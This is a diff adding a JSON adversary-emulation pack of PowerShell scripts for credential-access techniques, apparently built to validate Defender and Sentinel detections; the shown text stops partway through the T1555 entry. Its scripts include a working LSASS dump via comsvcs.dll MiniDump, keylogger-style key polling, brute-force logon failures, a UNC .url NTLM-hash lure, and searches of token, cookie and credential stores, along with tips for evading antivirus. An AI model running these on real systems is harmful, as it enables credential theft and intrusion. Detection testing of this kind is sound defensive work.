@@ -1,0 +1,429 @@
+{
+  "package_id": "excalibur-credaccess-v1",
+  "package_name": "Excalibur - Credential Access Emulation Pack",
+  "version": "1.0.0",
+  "description": "Adversary emulation scripts for the MITRE ATT&CK Credential Access tactic (TA0006). Covers 10 scriptable parent techniques: LSASS credential dump via comsvcs.dll, network sniffing via netsh trace LOLBin, input capture via GetAsyncKeyState API polling, brute force via LogonUser API failures (Event ID 4625), forced authentication via UNC .url lure file, application token theft (Azure CLI/browser OAuth token enumeration), web session cookie enumeration, unsecured credential search (filesystem + registry + env vars), password store enumeration (cmdkey + DPAPI), and Kerberoasting SPN LDAP enumeration. Local scripts run on any Morgana Windows agent. Validated against Microsoft Defender for Endpoint behavioral detection and Microsoft Sentinel built-in analytics rules.",
+  "author": "X3M.AI",
+  "created": "2026-06-08",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "TA0006",
+  "mitre_tactic_name": "Credential Access",
+  "prerequisites": [
+    "Windows 10/11 or Windows Server 2019/2022 test machine with Morgana agent installed",
+    "Microsoft Defender for Endpoint (MDE) onboarded and data connector active in Microsoft Sentinel",
+    "Windows Security Events via AMA connector active in Microsoft Sentinel (Event IDs: 4625, 4648)",
+    "For T1003 (LSASS): local Administrator or SYSTEM required. Credential Guard on Windows 11 / Server 2022 may block the actual dump write, but the rundll32 comsvcs.dll MiniDump process creation event is always generated.",
+    "For T1040 (netsh trace): local Administrator or SYSTEM required.",
+    "For T1558 (SPN enumeration): the test machine must be domain-joined. On workgroup machines the LDAP query fails gracefully - the attempt is still logged as LDAP telemetry in MDE.",
+    "Test environment only - never run against production systems or monitored production environments"
+  ],
+  "tag_categories": [
+    {
+      "category_id": "common_local",
+      "label": "Common - Local Environment (T1003, T1040, T1187)",
+      "description": "Shared temp directory used by T1003 (LSASS dump staging), T1040 (network trace file), and T1187 (UNC lure file). Set once. The default path is already Defender-excluded in a standard Morgana installation. The path must not contain spaces (required by netsh trace).",
+      "scope": "local",
+      "used_by_tcodes": ["T1003", "T1040", "T1187"],
+      "tags": [
+        {
+          "key": "excalibur_cred_temp_dir",
+          "label": "Temp Directory (Defender-excluded, no spaces in path)",
+          "description": "Directory for temporary test artefacts. Must be excluded from Microsoft Defender and must not contain spaces in the path (netsh trace requirement). Default is the standard Morgana data path which satisfies both conditions.",
+          "default": "C:\\ProgramData\\Morgana\\temp",
+          "example": "C:\\ProgramData\\Morgana\\temp",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "cred_t1003_lsass",
+      "label": "T1003 - OS Credential Dumping (LSASS via comsvcs.dll)",
+      "description": "Settings for the LSASS MiniDump script. The dump file is created in the Defender-excluded temp directory and deleted immediately. Note: Credential Guard on Windows 11 / Server 2022 may block the actual dump write, but the rundll32.exe + comsvcs.dll + MiniDump process creation event is always generated and is the primary detection signal.",
+      "scope": "local",
+      "used_by_tcodes": ["T1003"],
+      "tags": [
+        {
+          "key": "excalibur_cred_t1003_dump_name",
+          "label": "LSASS Dump Output Filename",
+          "description": "Filename for the LSASS MiniDump output in the Defender-excluded temp directory. File is deleted immediately if created. A non-.dmp extension can reduce AV interference during the test.",
+          "default": "MorganaTest-lsass.dmp",
+          "example": "MorganaTest-lsass.dmp",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "cred_t1040_net",
+      "label": "T1040 - Network Sniffing (netsh trace LOLBin)",
+      "description": "Settings for the network sniffing script. Uses the Windows-native netsh trace command (LOLBin) to start a packet capture. Capture is limited to 1 MB and runs for 3 seconds. Trace file is deleted after the test. Requires Administrator or SYSTEM.",
+      "scope": "local",
+      "used_by_tcodes": ["T1040"],
+      "tags": [
+        {
+          "key": "excalibur_cred_t1040_trace_name",
+          "label": "Network Trace Filename (no spaces)",
+          "description": "Filename for the ETL capture file in the Defender-excluded temp directory. Created and deleted by the script. Must not contain spaces (netsh trace limitation).",
+          "default": "MorganaTest-T1040-trace.etl",
+          "example": "MorganaTest-T1040-trace.etl",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "cred_t1110_brute",
+      "label": "T1110 - Brute Force (LogonUser API failures)",
+      "description": "Settings for the brute force simulation. Uses the Windows LogonUser Win32 API (advapi32.dll) to generate repeated LOGON_TYPE_NETWORK authentication failures against the local machine, producing Event ID 4625 for each attempt. No network access required. The fake username must not exist on the target machine.",
+      "scope": "local",
+      "used_by_tcodes": ["T1110"],
+      "tags": [
+        {
+          "key": "excalibur_cred_t1110_fake_user",
+          "label": "Fake Username for Logon Failures",
+          "description": "Non-existent username used for all LogonUser failure attempts. Must not be a real account on the target machine. Each attempt generates Event ID 4625 (An account failed to log on).",
+          "default": "MorganaTest-FakeUser",
+          "example": "MorganaTest-FakeUser",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "excalibur_cred_t1110_attempts",
+          "label": "Number of Failed Logon Attempts",
+          "description": "Number of LogonUser failures to generate. Each attempt produces one Event ID 4625. 5+ attempts typically satisfy the threshold for the Sentinel 'Brute Force' or 'Multiple authentication failures' analytics rule. Minimum recommended: 5.",
+          "default": "5",
+          "example": "5",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "cred_t1187_forced",
+      "label": "T1187 - Forced Authentication (UNC .url lure file)",
+      "description": "Settings for the forced authentication lure. Creates a Windows .url shortcut file containing a UNC path reference to a non-existent external IP. The IconFile UNC path is the classic NTLM credential capture trigger: when a user opens the file, Windows attempts to resolve the icon path and authenticates via NTLM, sending the NTLMv2 hash to the attacker-controlled SMB server. File is created and removed by the script - it is not opened during the test.",
+      "scope": "local",
+      "used_by_tcodes": ["T1187"],
+      "tags": [
+        {
+          "key": "excalibur_cred_t1187_unc_path",
+          "label": "UNC Path for NTLM Capture Reference",
+          "description": "UNC path embedded in the .url lure file as both the URL and IconFile reference. Use a non-routable external IP (TEST-NET 198.51.100.0/24 is safe and standardized for documentation use). The file creation containing this external UNC reference is the primary MDE detection signal.",
+          "default": "\\\\198.51.100.1\\MorganaTest",
+          "example": "\\\\198.51.100.1\\MorganaTest",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "excalibur_cred_t1187_filename",
+          "label": "Lure File Filename",
+          "description": "Name for the UNC lure .url file created in the temp directory. A social-engineering style name increases detection match probability for rules that look at suspicious file names.",
+          "default": "MorganaTest-ForcedAuth.url",
+          "example": "MorganaTest-InvoiceQ2-2026.url",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "cred_t1552_search",
+      "label": "T1552 - Unsecured Credentials (filesystem + registry + env search)",
+      "description": "Settings for the unsecured credential search simulation. Searches for credential patterns (password, passwd, secret, token, apikey) in common file types in the configured directory. Also enumerates credential-related environment variables and known credential registry paths. Keep the search path small for fast execution.",
+      "scope": "local",
+      "used_by_tcodes": ["T1552"],
+      "tags": [
+        {
+          "key": "excalibur_cred_t1552_search_path",
+          "label": "Credential Search Base Directory",
+          "description": "Root directory for the recursive file-based credential pattern search. Searched file types: .txt, .config, .ini, .xml, .json, .ps1, .bat (max depth 4). Default is C:\\Users\\Public (safe, always exists, small). Change to C:\\Users\\<username>\\Documents for more realistic signal.",
+          "default": "C:\\Users\\Public",
+          "example": "C:\\Users\\Public",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "cred_t1558_spn",
+      "label": "T1558 - Steal or Forge Kerberos Tickets (Kerberoasting SPN LDAP enumeration)",
+      "description": "Settings for the Kerberoasting SPN enumeration. Queries Active Directory for enabled user accounts with Service Principal Names using an [adsisearcher] LDAP query. Requires a domain-joined machine. On workgroup machines the LDAP query fails gracefully. The LDAP query telemetry is generated regardless of success and is the MDE detection indicator.",
+      "scope": "local",
+      "used_by_tcodes": ["T1558"],
+      "tags": [
+        {
+          "key": "excalibur_cred_t1558_max_results",
+          "label": "Maximum SPN Account Results",
+          "description": "Maximum number of SPN-bearing user account results to return from the LDAP query. Higher values generate more LDAP traffic and a stronger detection signal. On large domains, keep under 50 to avoid slow queries.",
+          "default": "20",
+          "example": "20",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    }
+  ],
+  "scripts": [
+    {
+      "id": "Excalibur - CredAccess-T1003-LSASS MiniDump",
+      "name": "Excalibur - CredAccess-T1003-LSASS MiniDump",
+      "description": "Invokes rundll32.exe with comsvcs.dll MiniDump to attempt an LSASS process memory dump, the most commonly used LOLBin technique for credential dumping (used by Mimikatz-equivalent LOL, APT29, Lazarus Group). The dump file is created in the Defender-excluded temp directory and deleted immediately. On systems with Credential Guard, the dump write is blocked, but the process creation event (rundll32 + comsvcs.dll + MiniDump in command line) is the primary MDE detection signal. Requires local Administrator or SYSTEM.",
+      "tactic": "Credential Access",
+      "tcode": "T1003",
+      "technique_name": "OS Credential Dumping",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_cred_temp_dir", "excalibur_cred_t1003_dump_name"],
+      "command": "Write-Host '[START] T1003 - OS Credential Dumping via comsvcs.dll MiniDump (LSASS)'; $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if (-not $isAdmin) { Write-Host '[ERROR] T1003 requires local Administrator or SYSTEM. Ensure Morgana agent runs with elevated privileges.'; exit 1 }; $tmpDir = '#{excalibur_cred_temp_dir}'; if (-not (Test-Path $tmpDir)) { New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null }; $dumpName = '#{excalibur_cred_t1003_dump_name}'; $dumpPath = Join-Path $tmpDir $dumpName; try { $lsassPid = (Get-Process -Name lsass -ErrorAction Stop).Id; Write-Host ('[INFO] LSASS PID: ' + $lsassPid + ' | Target dump path: ' + $dumpPath); Write-Host '[INFO] Invoking: rundll32.exe comsvcs.dll MiniDump <pid> <path> full - this pattern is the primary MDE detection indicator'; $argStr = 'C:\Windows\System32\comsvcs.dll MiniDump ' + $lsassPid + ' ' + $dumpPath + ' full'; $proc = Start-Process -FilePath 'rundll32.exe' -ArgumentList $argStr -PassThru -Wait -ErrorAction Stop; Write-Host ('[INFO] rundll32.exe exit code: ' + $proc.ExitCode); if (Test-Path $dumpPath) { $size = (Get-Item $dumpPath).Length; Write-Host ('[INFO] Dump file created (' + $size + ' bytes) - removing immediately'); Remove-Item $dumpPath -Force -ErrorAction SilentlyContinue } else { Write-Host '[INFO] Dump file not created (Credential Guard active or MDE blocked write) - process creation telemetry was still generated' }; Write-Host '[SUCCESS] T1003 - LSASS MiniDump attempt via comsvcs.dll completed. Sentinel target: LSASS memory read activity detected (MDE behavioral - rundll32 comsvcs.dll MiniDump process creation)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message); Remove-Item $dumpPath -ErrorAction SilentlyContinue }",
+      "cleanup_command": "Remove-Item (Join-Path '#{excalibur_cred_temp_dir}' '#{excalibur_cred_t1003_dump_name}') -ErrorAction SilentlyContinue; Write-Host '[INFO] T1003 cleanup: dump file removed if still present'",
+      "detection_rule": "LSASS memory read activity detected (comsvcs.dll MiniDump)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - CredAccess-T1040-Network Sniffing",
+      "name": "Excalibur - CredAccess-T1040-Network Sniffing",
+      "description": "Starts a network packet capture using the Windows-native netsh trace command (LOLBin), simulating adversary use of built-in OS tools to sniff network credentials. Capture is limited to 1 MB and runs for 3 seconds. The ETL trace file is deleted after the test. netsh trace is a well-known LOLBin monitored by MDE behavioral rules. Requires local Administrator or SYSTEM.",
+      "tactic": "Credential Access",
+      "tcode": "T1040",
+      "technique_name": "Network Sniffing",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_cred_temp_dir", "excalibur_cred_t1040_trace_name"],
+      "command": "Write-Host '[START] T1040 - Network Sniffing via netsh trace LOLBin'; $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if (-not $isAdmin) { Write-Host '[ERROR] T1040 requires local Administrator or SYSTEM.'; exit 1 }; $tmpDir = '#{excalibur_cred_temp_dir}'; if (-not (Test-Path $tmpDir)) { New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null }; $traceName = '#{excalibur_cred_t1040_trace_name}'; $tracePath = Join-Path $tmpDir $traceName; try { $null = Start-Process 'netsh.exe' -ArgumentList 'trace stop' -Wait -PassThru -ErrorAction SilentlyContinue; Write-Host '[INFO] Pre-stopped any existing active trace'; $startArgs = 'trace start capture=yes maxsize=1 overwrite=yes tracefile=' + $tracePath; $startProc = Start-Process 'netsh.exe' -ArgumentList $startArgs -Wait -PassThru -ErrorAction Stop; Write-Host ('[INFO] netsh trace start exit code: ' + $startProc.ExitCode + ' | Capture file: ' + $tracePath); if ($startProc.ExitCode -ne 0) { Write-Host '[WARN] netsh trace start returned non-zero exit code - may indicate trace already running or path issue' }; Write-Host '[INFO] Network packet capture running for 3 seconds...'; Start-Sleep 3; $stopProc = Start-Process 'netsh.exe' -ArgumentList 'trace stop' -Wait -PassThru -ErrorAction Stop; Write-Host ('[INFO] netsh trace stop exit code: ' + $stopProc.ExitCode); if (Test-Path $tracePath) { $size = (Get-Item $tracePath).Length; Write-Host ('[INFO] Trace ETL file: ' + $tracePath + ' (' + $size + ' bytes) - removing'); Remove-Item $tracePath -ErrorAction SilentlyContinue }; Get-ChildItem $tmpDir -Filter '*.cab' -ErrorAction SilentlyContinue | Remove-Item -ErrorAction SilentlyContinue; Write-Host '[SUCCESS] T1040 - Network sniffing via netsh trace LOLBin completed. Sentinel target: Network packet capture using built-in OS tool (MDE behavioral - netsh trace process creation)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message); Start-Process 'netsh.exe' -ArgumentList 'trace stop' -Wait -ErrorAction SilentlyContinue }",
+      "cleanup_command": "Start-Process 'netsh.exe' -ArgumentList 'trace stop' -Wait -ErrorAction SilentlyContinue; Remove-Item (Join-Path '#{excalibur_cred_temp_dir}' '#{excalibur_cred_t1040_trace_name}') -ErrorAction SilentlyContinue; Get-ChildItem '#{excalibur_cred_temp_dir}' -Filter '*.cab' -ErrorAction SilentlyContinue | Remove-Item -ErrorAction SilentlyContinue; Write-Host '[INFO] T1040 cleanup: trace stopped and files removed if still present'",
+      "detection_rule": "Network packet capture using built-in OS tool (netsh trace)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - CredAccess-T1056-Input Capture",
+      "name": "Excalibur - CredAccess-T1056-Input Capture",
+      "description": "Simulates keylogger behavior by polling keyboard state for all alphanumeric keys via the GetAsyncKeyState Win32 API (user32.dll), a well-known keylogger API pattern. Uses P/Invoke via Add-Type inline C#. The repeated polling loop across A-Z and 0-9 virtual key codes across multiple passes is the MDE behavioral signature for input capture detection. No actual keystrokes are captured or stored.",
+      "tactic": "Credential Access",
+      "tcode": "T1056",
+      "technique_name": "Input Capture",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1056 - Input Capture via GetAsyncKeyState API polling (keylogger pattern)'; try { Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class MorganaT1056 { [DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey); }' -ErrorAction Stop; $vkCodes = @(0x30..0x39) + @(0x41..0x5A); Write-Host ('[INFO] Polling ' + $vkCodes.Count + ' virtual key codes (VK 0x30-0x39 = 0-9, VK 0x41-0x5A = A-Z) via GetAsyncKeyState across 3 passes'); $callCount = 0; for ($pass = 1; $pass -le 3; $pass++) { foreach ($vk in $vkCodes) { $state = [MorganaT1056]::GetAsyncKeyState($vk); $callCount++ }; Write-Host ('[INFO] Pass ' + $pass + ' complete - ' + $vkCodes.Count + ' GetAsyncKeyState calls made'); Start-Sleep 1 }; Write-Host ('[INFO] Total GetAsyncKeyState calls: ' + $callCount + ' (keylogger polling pattern - no keystrokes captured or stored)'); Write-Host '[SUCCESS] T1056 - Input capture API polling completed. Sentinel target: Suspicious keyboard state polling via GetAsyncKeyState (MDE behavioral input capture detection)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message) }",
+      "cleanup_command": "Write-Host '[INFO] T1056 cleanup: no persistent artefacts - API calls only, no files created'",
+      "detection_rule": "Suspicious keyboard state polling via GetAsyncKeyState",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - CredAccess-T1110-Brute Force",
+      "name": "Excalibur - CredAccess-T1110-Brute Force",
+      "description": "Generates repeated authentication failures against the local machine using the Windows LogonUser Win32 API (advapi32.dll) with LOGON32_LOGON_NETWORK (type 3), simulating a network credential brute force attack. Each failed attempt produces Event ID 4625 (An account failed to log on). No network access required. The fake username does not exist, ensuring all attempts fail with error 1317 (user not found) or 1326 (wrong password). 5+ failures typically trigger the Sentinel brute force analytics rule.",
+      "tactic": "Credential Access",
+      "tcode": "T1110",
+      "technique_name": "Brute Force",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_cred_t1110_fake_user", "excalibur_cred_t1110_attempts"],
+      "command": "Write-Host '[START] T1110 - Brute Force via repeated LogonUser API failures'; try { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class MorganaT1110 { [DllImport(\"advapi32.dll\", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken); [DllImport(\"kernel32.dll\", SetLastError=true)] public static extern bool CloseHandle(IntPtr hObject); }' -ErrorAction Stop; $fakeUser = '#{excalibur_cred_t1110_fake_user}'; $attempts = [int]'#{excalibur_cred_t1110_attempts}'; $LOGON32_LOGON_NETWORK = 3; $LOGON32_PROVIDER_DEFAULT = 0; Write-Host ('[INFO] Generating ' + $attempts + ' failed logon attempts | Username: ' + $fakeUser + ' | Domain: ' + $env:COMPUTERNAME + ' | LogonType: NETWORK (3)'); for ($i = 1; $i -le $attempts; $i++) { $token = [IntPtr]::Zero; $result = [MorganaT1110]::LogonUser($fakeUser, $env:COMPUTERNAME, ('WrongPassword' + $i), $LOGON32_LOGON_NETWORK, $LOGON32_PROVIDER_DEFAULT, [ref]$token); $errCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error(); if ($token -ne [IntPtr]::Zero) { [MorganaT1110]::CloseHandle($token) | Out-Null }; Write-Host ('[INFO] Attempt ' + $i + '/' + $attempts + ': LogonUser=' + $result + ' | Win32Error=' + $errCode + ' (1317=user not found, 1326=wrong password) - Event ID 4625 generated'); Start-Sleep 1 }; Write-Host '[SUCCESS] T1110 - Brute force failed logon simulation completed. Sentinel target: Multiple failed authentication attempts - Brute Force (Event ID 4625)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message) }",
+      "cleanup_command": "Write-Host '[INFO] T1110 cleanup: no persistent artefacts - LogonUser API calls only'",
+      "detection_rule": "Multiple failed authentication attempts - Brute Force",
+      "sentinel_connector": "Windows Security Events via AMA",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - CredAccess-T1187-Forced Authentication",
+      "name": "Excalibur - CredAccess-T1187-Forced Authentication",
+      "description": "Creates a Windows .url shortcut file containing a UNC path (IconFile and URL fields) pointing to a non-existent external IP address, simulating the classic NTLM credential capture lure. When opened by a user or rendered by an application, Windows automatically attempts to resolve the icon via SMB and authenticates with the user's NTLMv2 hash. The script creates the file in the Defender-excluded temp directory and removes it immediately. The file creation with external UNC reference is the MDE detection signal - the lure is not actually triggered by the script.",
+      "tactic": "Credential Access",
+      "tcode": "T1187",
+      "technique_name": "Forced Authentication",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_cred_temp_dir", "excalibur_cred_t1187_unc_path", "excalibur_cred_t1187_filename"],
+      "command": "Write-Host '[START] T1187 - Forced Authentication via UNC .url lure file creation'; $tmpDir = '#{excalibur_cred_temp_dir}'; if (-not (Test-Path $tmpDir)) { New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null }; $uncPath = '#{excalibur_cred_t1187_unc_path}'; $fileName = '#{excalibur_cred_t1187_filename}'; $filePath = Join-Path $tmpDir $fileName; try { $urlContent = '[InternetShortcut]' + [char]13 + [char]10 + 'URL=file:///' + $uncPath + [char]13 + [char]10 + 'IconFile=' + $uncPath + '\\icon.ico' + [char]13 + [char]10 + 'IconIndex=0'; Set-Content -Path $filePath -Value $urlContent -Encoding ASCII -ErrorAction Stop; Write-Host ('[INFO] UNC lure file created: ' + $filePath); Write-Host ('[INFO] IconFile UNC reference: ' + $uncPath + '\\icon.ico - would trigger NTLM hash capture if opened'); $fileInfo = Get-Item $filePath -ErrorAction SilentlyContinue; if ($fileInfo) { Write-Host ('[INFO] File size: ' + $fileInfo.Length + ' bytes | Created: ' + $fileInfo.CreationTime) }; Start-Sleep 2; Remove-Item $filePath -ErrorAction SilentlyContinue; Write-Host '[SUCCESS] T1187 - Forced authentication UNC lure file created and removed. Sentinel target: .url/.lnk file with external UNC path reference (MDE file creation detection - NTLM relay lure pattern)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message); Remove-Item $filePath -ErrorAction SilentlyContinue }",
+      "cleanup_command": "Remove-Item (Join-Path '#{excalibur_cred_temp_dir}' '#{excalibur_cred_t1187_filename}') -ErrorAction SilentlyContinue; Write-Host '[INFO] T1187 cleanup: lure file removed if still present'",
+      "detection_rule": "UNC path reference in shortcut file pointing to external IP (NTLM lure pattern)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - CredAccess-T1528-Steal Application Access Token",
+      "name": "Excalibur - CredAccess-T1528-Steal Application Access Token",
+      "description": "Enumerates known OAuth token cache file locations for Azure CLI, GitHub CLI, VS Code, and browser web data stores, simulating adversary reconnaissance of application access token stores for credential theft. Read-only path enumeration - no token content is read or exfiltrated. File access events on OAuth token stores are monitored by MDE. Common targets: msal_token_cache.json (Azure CLI), GitHub CLI hosts.yml, Chrome/Edge Web Data.",
+      "tactic": "Credential Access",
+      "tcode": "T1528",
+      "technique_name": "Steal Application Access Token",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1528 - Steal Application Access Token (OAuth token store enumeration)'; $tokenPaths = @( [System.IO.Path]::Combine($env:USERPROFILE, '.azure', 'msal_token_cache.json'), [System.IO.Path]::Combine($env:USERPROFILE, '.azure', 'accessTokens.json'), [System.IO.Path]::Combine($env:LOCALAPPDATA, '.IdentityService', 'msal.cache'), [System.IO.Path]::Combine($env:APPDATA, 'GitHub CLI', 'hosts.yml'), [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Web Data'), [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data'), [System.IO.Path]::Combine($env:APPDATA, 'Code', 'User', 'globalStorage', 'github.copilot', 'hosts.json') ); Write-Host ('[INFO] Enumerating ' + $tokenPaths.Count + ' known OAuth token cache locations (Azure CLI, GitHub CLI, VS Code, Chrome, Edge)'); $found = 0; foreach ($path in $tokenPaths) { try { $item = Get-Item -LiteralPath $path -ErrorAction SilentlyContinue; if ($item) { $found++; Write-Host ('[INFO] Token store found: ' + $item.FullName + ' | Size: ' + $item.Length + ' bytes | Modified: ' + $item.LastWriteTime) } else { Write-Host ('[INFO] Not found: ' + $path) } } catch { Write-Host ('[INFO] Access error: ' + $path) } }; Write-Host ('[INFO] OAuth token stores discovered: ' + $found + '/' + $tokenPaths.Count + ' (token content not read)'); Write-Host '[SUCCESS] T1528 - Application access token enumeration completed. Sentinel target: Access to OAuth token cache files (MDE file access telemetry)'",
+      "cleanup_command": "Write-Host '[INFO] T1528 cleanup: no artefacts - read-only path enumeration only'",
+      "detection_rule": "Access to OAuth token cache files",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - CredAccess-T1539-Steal Web Session Cookie",
+      "name": "Excalibur - CredAccess-T1539-Steal Web Session Cookie",
+      "description": "Enumerates browser cookie storage paths for Chrome, Edge, and Firefox, simulating adversary reconnaissance for web session cookie theft. The browser cookie databases (SQLite files) are enumerated with file metadata - content is not read. MDE monitors file access attempts on browser cookie stores. Chrome and Edge lock their Cookies SQLite file while the browser is running, so file access failures are expected and still generate telemetry.",
+      "tactic": "Credential Access",
+      "tcode": "T1539",
+      "technique_name": "Steal Web Session Cookie",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1539 - Steal Web Session Cookie (browser cookie store enumeration)'; $cookiePaths = @( [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'), [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'), [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies'), [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'), [System.IO.Path]::Combine($env:APPDATA, 'Mozilla', 'Firefox', 'Profiles') ); Write-Host ('[INFO] Enumerating ' + $cookiePaths.Count + ' browser cookie store paths (Chrome, Edge, Firefox)'); $found = 0; foreach ($path in $cookiePaths) { try { $item = Get-Item -LiteralPath $path -ErrorAction SilentlyContinue; if ($item) { $found++; if ($item.PSIsContainer) { $count = (Get-ChildItem -LiteralPath $item.FullName -Recurse -ErrorAction SilentlyContinue).Count; Write-Host ('[INFO] Firefox profile dir found: ' + $item.FullName + ' | ' + $count + ' items') } else { Write-Host ('[INFO] Browser cookie SQLite found: ' + $item.FullName + ' | Size: ' + $item.Length + ' bytes | Modified: ' + $item.LastWriteTime) } } else { Write-Host ('[INFO] Not found: ' + $path) } } catch { Write-Host ('[INFO] Access error: ' + $path) } }; Write-Host ('[INFO] Browser cookie stores discovered: ' + $found + '/' + $cookiePaths.Count + ' (cookie content not read)'); Write-Host '[SUCCESS] T1539 - Web session cookie enumeration completed. Sentinel target: Access to browser cookie storage databases (MDE file access telemetry)'",
+      "cleanup_command": "Write-Host '[INFO] T1539 cleanup: no artefacts - read-only path enumeration only'",
+      "detection_rule": "Access to browser cookie storage databases",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - CredAccess-T1552-Unsecured Credentials",
+      "name": "Excalibur - CredAccess-T1552-Unsecured Credentials",
+      "description": "Simulates adversary search for credentials stored in plaintext across three vectors: (1) filesystem search for credential keyword patterns (password, passwd, secret, token, apikey) in common file types; (2) enumeration of environment variables with credential-like names; (3) registry path enumeration for known credential stores (PuTTY sessions, WinSCP, Remote Desktop saved passwords). Read-only - no credential content is exfiltrated. The file system search pattern and registry access are the MDE detection indicators.",
+      "tactic": "Credential Access",
+      "tcode": "T1552",
+      "technique_name": "Unsecured Credentials",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": ["excalibur_cred_t1552_search_path"],
+      "command": "Write-Host '[START] T1552 - Unsecured Credentials (filesystem + environment + registry search)'; $searchPath = '#{excalibur_cred_t1552_search_path}'; Write-Host ('[INFO] Search 1/3: Filesystem credential pattern search in: ' + $searchPath + ' (depth 4, types: txt/config/ini/xml/json/ps1/bat)'); try { $fileMatches = Get-ChildItem -Path $searchPath -Recurse -Include *.txt,*.config,*.ini,*.xml,*.json,*.ps1,*.bat -ErrorAction SilentlyContinue -Depth 4 | Select-String -Pattern 'password|passwd|secret|apikey|token|credential' -ErrorAction SilentlyContinue | Select-Object -First 10; if ($fileMatches) { Write-Host ('[INFO]   Credential patterns found in ' + @($fileMatches).Count + ' location(s):'); $fileMatches | ForEach-Object { Write-Host ('    ' + $_.Filename + ':L' + $_.LineNumber + ' - match logged (value not shown)') } } else { Write-Host '[INFO]   No credential patterns found in filesystem (expected in clean test environment)' } } catch { Write-Host ('[INFO]   Filesystem search error: ' + $_.Exception.Message) }; Write-Host '[INFO] Search 2/3: Environment variables with credential-like names'; $credEnvVars = Get-ChildItem env: | Where-Object { $_.Name -imatch 'pass|secret|key|token|cred|api' } | Select-Object -ExpandProperty Name; if ($credEnvVars) { Write-Host ('[INFO]   Credential-like env vars found: ' + ($credEnvVars -join ', ') + ' (values not logged)') } else { Write-Host '[INFO]   No credential-like environment variables found' }; Write-Host '[INFO] Search 3/3: Registry credential stores (PuTTY, WinSCP, Remote Desktop)'; $regPaths = @('HKCU:\Software\SimonTatham\PuTTY\Sessions', 'HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions', 'HKCU:\Software\Microsoft\Terminal Server Client\Servers'); foreach ($regPath in $regPaths) { if (Test-Path $regPath) { Write-Host ('[INFO]   Registry credential store found: ' + $regPath) } else { Write-Host ('[INFO]   Not found: ' + $regPath) } }; Write-Host '[SUCCESS] T1552 - Unsecured credential search completed. Sentinel target: Sensitive file access and registry credential store enumeration (MDE behavioral)'",
+      "cleanup_command": "Write-Host '[INFO] T1552 cleanup: no artefacts - read-only search only'",
+      "detection_rule": "Credential file access and registry credential store enumeration",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - CredAccess-T1555-Password Stores",
+      "name": "Excalibur - CredAccess-T1555-Password Stores",
